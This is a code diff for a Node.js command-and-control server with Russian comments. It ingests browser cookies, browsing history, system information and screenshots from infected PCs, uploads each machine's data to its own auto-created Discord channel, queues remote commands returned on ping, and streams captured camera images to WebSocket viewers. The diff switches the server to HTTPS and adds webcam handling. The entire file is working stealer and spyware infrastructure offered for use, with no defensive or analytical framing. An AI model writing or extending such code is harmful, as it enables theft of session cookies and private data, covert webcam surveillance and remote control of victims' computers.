@@ -1,7 +1,8 @@
 import express from "express";
 import { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } from "discord.js";
 import { WebSocketServer } from "ws";
-import http from "http";
+import https from "https";
+import fs from "fs";
 import { fileURLToPath } from "url";
 import { dirname, join } from "path";
 
@@ -14,14 +15,16 @@ app.use(express.json({ limit: "50mb" }));
 // ---------- Конфиг ----------
 const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
 const GUILD_ID = process.env.GUILD_ID;
-const CATEGORY_NAME = "Все ПК";
+const CATEGORY_PC = "Все ПК";
+const CATEGORY_CAM = "Камеры";
 const ONLINE_TIMEOUT = 3 * 60 * 1000;
 
 // ---------- Состояние ----------
 const onlinePCs = {};           // pcId -> timestamp
 const pendingCommands = {};     // pcId -> array of commands
 const channelByPC = {};         // pcId -> channelId
-const wsCameraClients = {};     // pcId -> array of ws для live-камеры
+const onlineCams = {};          // camId -> timestamp
+const wsCameraClients = {};     // camId -> array of ws для live-камеры
 
 // ---------- Discord Bot ----------
 const bot = new Client({ intents: [GatewayIntentBits.Guilds] });
@@ -69,94 +72,79 @@ bot.on("interactionCreate", async interaction => {
 // ---------- Категория и канал ----------
 async function getOrCreateCategory(guild, name){
     const channels = await guild.channels.fetch();
-
     const matches = channels.filter(c => c.type === ChannelType.GuildCategory && c.name === name);
-
-    if (matches.size > 1) {
-        const sorted = [...matches.values()].sort((a, b) => b.createdTimestamp - a.createdTimestamp);
+    if(matches.size > 1){
+        const sorted = [...matches.values()].sort((a,b)=>b.createdTimestamp - a.createdTimestamp);
         const keep = sorted[0];
         const toDelete = sorted.slice(1);
-
-        for (const cat of toDelete) {
-            try { await cat.delete(); } catch (e) { console.error("Ошибка удаления дубля категории:", e); }
-        }
-
+        for(const cat of toDelete){ try{ await cat.delete(); } catch(e){ console.error(e); } }
         return keep;
     }
-
-    if (matches.size === 1) {
-        return matches.first();
-    }
-
+    if(matches.size === 1) return matches.first();
     return await guild.channels.create({ name, type: ChannelType.GuildCategory });
 }
 
 async function getOrCreateTextChannel(guild, name, parentId){
     const channels = await guild.channels.fetch();
-
-    const matches = channels.filter(
-        c => c.type === ChannelType.GuildText && c.name === name && c.parentId === parentId
-    );
-
-    if (matches.size > 1) {
-        const sorted = [...matches.values()].sort((a, b) => b.createdTimestamp - a.createdTimestamp);
+    const matches = channels.filter(c => c.type === ChannelType.GuildText && c.name === name && c.parentId === parentId);
+    if(matches.size > 1){
+        const sorted = [...matches.values()].sort((a,b)=>b.createdTimestamp - a.createdTimestamp);
         const keep = sorted[0];
         const toDelete = sorted.slice(1);
-
-        for (const ch of toDelete) {
-            try { await ch.delete(); } catch (e) { console.error("Ошибка удаления дубля канала:", e); }
-        }
-
+        for(const ch of toDelete){ try{ await ch.delete(); } catch(e){ console.error(e); } }
         return keep;
     }
-
-    if (matches.size === 1) {
-        return matches.first();
-    }
-
-    return await guild.channels.create({
-        name,
-        type: ChannelType.GuildText,
-        parent: parentId
-    });
+    if(matches.size === 1) return matches.first();
+    return await guild.channels.create({ name, type: ChannelType.GuildText, parent: parentId });
 }
 
-// ---------- Приём данных ----------
-app.post("/upload", async (req, res) => {
+// ---------- Upload ПК ----------
+app.post("/upload-pc", async (req, res) => {
     try {
         const { pcId, cookies, history, systemInfo, screenshot } = req.body;
         if(!pcId) return res.status(400).json({ error:"pcId required" });
-
         onlinePCs[pcId] = Date.now();
 
         const guild = await bot.guilds.fetch(GUILD_ID);
-        const category = await getOrCreateCategory(guild, CATEGORY_NAME);
+        const category = await getOrCreateCategory(guild, CATEGORY_PC);
         const channel = channelByPC[pcId] ? await guild.channels.fetch(channelByPC[pcId]).catch(()=>null) : null;
         const finalChannel = channel || await getOrCreateTextChannel(guild, pcId, category.id);
         channelByPC[pcId] = finalChannel.id;
 
         const files = [];
-        if(cookies) files.push({ attachment: Buffer.from(JSON.stringify(cookies, null, 2)), name: `${pcId}-cookies.json` });
-        if(history) files.push({ attachment: Buffer.from(JSON.stringify(history, null, 2)), name: `${pcId}-history.json` });
-        if(systemInfo) files.push({ attachment: Buffer.from(JSON.stringify(systemInfo, null, 2)), name: `${pcId}-system.json` });
-        if(screenshot) files.push({ attachment: Buffer.from(screenshot, "base64"), name: `${pcId}-screenshot.jpeg` });
-
+        if(cookies) files.push({ attachment: Buffer.from(JSON.stringify(cookies,null,2)), name:`${pcId}-cookies.json` });
+        if(history) files.push({ attachment: Buffer.from(JSON.stringify(history,null,2)), name:`${pcId}-history.json` });
+        if(systemInfo) files.push({ attachment: Buffer.from(JSON.stringify(systemInfo,null,2)), name:`${pcId}-system.json` });
+        if(screenshot) files.push({ attachment: Buffer.from(screenshot,"base64"), name:`${pcId}-screenshot.jpeg` });
         if(files.length) await finalChannel.send({ files });
 
-        if(screenshot && wsCameraClients[pcId]){
-            wsCameraClients[pcId].forEach(ws => {
-                try { ws.send(screenshot); } catch(e){ }
+        // Отправка кнопок
+        const buttons = createControlButtons(pcId);
+        await finalChannel.send({ content: `Управление ПК: ${pcId}`, components: buttons });
+
+        res.json({ success:true });
+    } catch(err){ console.error(err); res.status(500).json({ error: err.message }); }
+});
+
+// ---------- Upload Камеры ----------
+app.post("/upload-cam", (req,res)=>{
+    try{
+        const { camId, screenshot } = req.body;
+        if(!camId || !screenshot) return res.status(400).json({ error:"camId and screenshot required" });
+        onlineCams[camId] = Date.now();
+
+        // Отправка WS клиентам
+        if(wsCameraClients[camId]){
+            wsCameraClients[camId].forEach(ws => {
+                try{ ws.send(screenshot); } catch(e){}
             });
         }
 
         res.json({ success:true });
-    } catch(err){
-        console.error(err);
-        res.status(500).json({ error: err.message });
-    }
+    } catch(err){ console.error(err); res.status(500).json({ error: err.message }); }
 });
 
-// ---------- Пинг ----------
+// ---------- Пинг ПК ----------
 app.post("/ping", (req,res)=>{
     const { pcId } = req.body;
     if(!pcId) return res.status(400).json({ error:"pcId required" });
@@ -166,10 +154,17 @@ app.post("/ping", (req,res)=>{
     res.json({ commands });
 });
 
-// ---------- API фронта ----------
-app.get("/api/online-pcs", (req,res)=>{
-    res.json(Object.keys(onlinePCs));
+// ---------- Пинг Камеры ----------
+app.post("/ping-cam", (req,res)=>{
+    const { camId } = req.body;
+    if(!camId) return res.status(400).json({ error:"camId required" });
+    onlineCams[camId] = Date.now();
+    res.json({ success:true });
 });
+
+// ---------- API фронта ----------
+app.get("/api/online-pcs", (req,res)=> res.json(Object.keys(onlinePCs)));
+app.get("/api/online-cams", (req,res)=> res.json(Object.keys(onlineCams)));
 
 // ---------- Статика ----------
 app.use(express.static(join(__dirname,"public")));
@@ -178,24 +173,27 @@ app.use(express.static(join(__dirname,"public")));
 const wss = new WebSocketServer({ noServer: true });
 wss.on("connection", (ws, req)=>{
     const url = new URL(req.url, `https://${req.headers.host}`);
-    const pcId = url.searchParams.get("pcId");
-    if(!pcId) return ws.close();
+    const camId = url.searchParams.get("camId");
+    if(!camId) return ws.close();
 
-    if(!wsCameraClients[pcId]) wsCameraClients[pcId] = [];
-    wsCameraClients[pcId].push(ws);
+    if(!wsCameraClients[camId]) wsCameraClients[camId] = [];
+    wsCameraClients[camId].push(ws);
 
-    ws.on("close", () => {
-        wsCameraClients[pcId] = wsCameraClients[pcId].filter(c=>c!==ws);
-    });
+    ws.on("close", () => { wsCameraClients[camId] = wsCameraClients[camId].filter(c=>c!==ws); });
 });
 
-// ---------- HTTP + WS ----------
-const server = http.createServer(app);
+// ---------- HTTPS сервер ----------
+const options = {
+    key: fs.readFileSync("/path/to/privkey.pem"),
+    cert: fs.readFileSync("/path/to/fullchain.pem")
+};
+const server = https.createServer(options, app);
+
 server.on("upgrade", (request, socket, head) => {
     wss.handleUpgrade(request, socket, head, ws => wss.emit("connection", ws, request));
 });
 
 // ---------- Запуск ----------
-const PORT = process.env.PORT || 3000;
-server.listen(PORT,()=>console.log(`🚀 Сервер слушает порт ${PORT}`));
+const PORT = process.env.PORT || 443;
+server.listen(PORT,()=>console.log(`🚀 HTTPS сервер слушает порт ${PORT}`));
 bot.login(DISCORD_BOT_TOKEN);
